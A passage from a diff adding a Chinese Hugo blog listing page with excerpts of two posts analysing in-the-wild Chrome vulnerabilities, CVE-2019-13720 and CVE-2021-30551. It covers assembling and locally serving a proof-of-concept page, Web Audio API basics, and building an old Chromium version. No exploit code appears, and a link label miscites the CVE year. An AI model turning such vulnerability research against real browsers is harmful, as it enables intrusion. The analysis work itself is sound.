+<p>从分析报告提取出 POC 代码片段，拼凑成一个完整的 POC 页面，代码中缺少 <code>getPartitionPageFreeListHeadEntryBySlotSize</code> 函数，先补充一个空函数，稍后理解了 POC 后再把它补上了。</p>
+<p>python -m http.server 为 POC 页面搭建一个本地站点，Chrome.exe 访问 http://localhost:8000/ 确认可以触发漏洞。</p>
+<h3 id="web-audio-api">Web Audio API</h3>
+<hr>
+<p><strong>ℹ️NOTE</strong></p>
+<p>POC 用到了很多 Web Audio API 相关的对象，推荐先看下 MDN 相关页面：</p>
+<ul>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Audio_API/Using_Web_Audio_API">MDN Using Web Audio API</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Audio_API">MDN Web Audio API</a></li>
+</ul>
+<hr>
+<p>Web Audio API 提供了流式处理音频数据的能力，支持音频解码，音效处理等常用操作。</p>
+<p>用法：先创建 AudioContext 对象，再创建多个音频节点，将它们连到一起组成音频处理图。AudioContext 对象有一个特殊的 desination 节点，代表最终输出的音频。处理图从源节点开始，到目的节点结束，中间可以连接多个音效节点。启动处理任务，音频数据就沿着图到达各个中间节点，经过中间节点的处理，再继续流转到下个节点。</p>
+    </div>
+    <a href="/posts/2022-05-26-cve-2019-13720/" class="ba b--moon-gray bg-light-gray br2 color-inherit dib f7 hover-bg-moon-gray link mt2 ph2 pv1">read more</a>
+  </div>
+</div>
+
+        </div>
+      
+        <div class="relative w-100 w-30-l mb4 bg-white">
+          <div class="relative w-100 mb4 bg-white nested-copy-line-height">
+  <div class="bg-white mb3 pa4 gray overflow-hidden">
+    <span class="f6 db">Posts</span>
+    <h1 class="f3 near-black">
+      <a href="/posts/2022-04-30-cve-2021-30551/" class="link black dim">
+        分析 CVE-2021-30551
+      </a>
+    </h1>
+    <div class="nested-links f5 lh-copy nested-copy-line-height">
+      <p>分析 2021 年的 Chrome 在野利用 <a href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-30551.html">CVE-2022-30551</a>。</p>
+<h2 id="准备环境">准备环境</h2>
+<h3 id="构建-chrome">构建 Chrome</h3>
+<p>从<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1216437"> Bug Report 页面</a>，找到受影响的 Chromium 版本 93.0.4532.0。
+依照<a href="2022-05-31-get-old-version-chrome-binary.md">获取旧版本的 Chrome</a> 记录的方法，从源码构建出 Chrome.exe。</p>
+<h4 id="拉取源码">拉取源码</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git fetch https://chromium.googlesource.com/chromium/src.git +refs/tags/93.0.4532.0:chromium_93.0.4532.0 --depth <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>git checkout tags/93.0.4532.0
+</span></span><span style="display:flex;"><span>gn args out/cve-2021-30551
+</span></span><span style="display:flex;"><span>ninja -C .<span style="color:#ae81ff">\o</span>ut<span style="color:#ae81ff">\c</span>ve-2021-30551 chrome
+</span></span></code></pre></div><h4 id="argsgn">args.gn</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ini" data-lang="ini"><span style="display:flex;"><span><span style="color:#75715e"># Build arguments go here.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># See &#34;gn args &lt;out_dir&gt; --list&#34; for available build arguments.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># reduce build time</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">is_component_build</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">true</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">enable_nacl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">false</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># build release version，disable DCHECK</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># DCHECK is chrome&#39;s assert</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">is_debug</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">false</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">dcheck_always_on</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">false</span>
+</span></span></code></pre></div><h4 id="vs-解决方案">VS 解决方案</h4>
+<p><code>gn gen --ide=vs --filters='//base;v8' --sln=v8_base .\out\cve-2021-30551\</code></p>
+    </div>
+    <a href="/posts/2022-04-30-cve-2021-30551/" class="ba b--moon-gray bg-light-gray br2 color-inherit dib f7 hover-bg-moon-gray link mt2 ph2 pv1">read more</a>
+  </div>
+</div>
+
+        </div>
+      
+    </section>
+    <ul class="pagination pagination-default">
+      <li class="page-item">
+        <a href="/posts/" aria-label="First" class="page-link" role="button"><span aria-hidden="true">&laquo;&laquo;</span></a>
+      </li>
+      <li class="page-item">
+        <a href="/posts/" aria-label="Previous" class="page-link" role="button"><span aria-hidden="true">&laquo;</span></a>
+      </li>
+      <li class="page-item">
+        <a href="/posts/" aria-label="Page 1" class="page-link" role="button">1</a>
+      </li>
+      <li class="page-item active">
+        <a aria-current="page" aria-label="Page 2" class="page-link" role="button">2</a>
+      </li>
+      <li class="page-item">
+        <a href="/posts/page/3/" aria-label="Page 3" class="page-link" role="button">3</a>
+      </li>
+      <li class="page-item">
+        <a href="/posts/page/3/" aria-label="Next" class="page-link" role="button"><span aria-hidden="true">&raquo;</span></a>
+      </li>
+      <li class="page-item">
+        <a href="/posts/page/3/" aria-label="Last" class="page-link" role="button"><span aria-hidden="true">&raquo;&raquo;</span></a>
+      </li>
+    </ul></article>
+
+    </main>
+    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
+  <div class="flex justify-between">
+  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="http://localhost:1313/" >
+    &copy;  My New Hugo Site 2024 
+  </a>
+    <div><div class="ananke-socials"></div>
+</div>
+  </div>
+</footer>
+
+  </body>
+</html>
